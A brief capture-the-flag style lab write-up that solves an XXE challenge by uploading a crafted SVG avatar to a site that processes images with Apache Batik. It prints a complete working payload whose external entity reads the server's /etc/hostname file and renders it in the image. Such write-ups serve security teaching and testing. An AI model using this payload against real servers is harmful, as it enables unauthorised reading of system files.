*This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.
To solve the lab, upload an image that displays the contents of the /etc/hostname file after processing. Then use the "Submit solution" button to submit the value of the server hostname.*

Decided to post a comment. I created the following malicious `exploit.svg` file:
```exploit.svg
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```
Uploaded the picture along with the comment:

I checked the comment after it was submitted. This is seen from the avatar picture:

Submitted this to solve the lab.
